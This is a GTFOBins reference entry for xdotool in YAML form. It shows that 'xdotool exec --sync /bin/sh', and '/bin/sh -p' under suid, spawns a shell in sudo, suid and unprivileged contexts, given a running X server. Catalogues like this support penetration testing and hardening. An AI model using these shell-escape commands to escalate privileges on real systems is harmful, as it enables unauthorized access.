<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/xdotool -->
---
comment: |-
  This requires a running X server.
functions:
  shell:
  - code: |-
      xdotool exec --sync /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          xdotool exec --sync /bin/sh -p
        shell: false
      unprivileged:
...
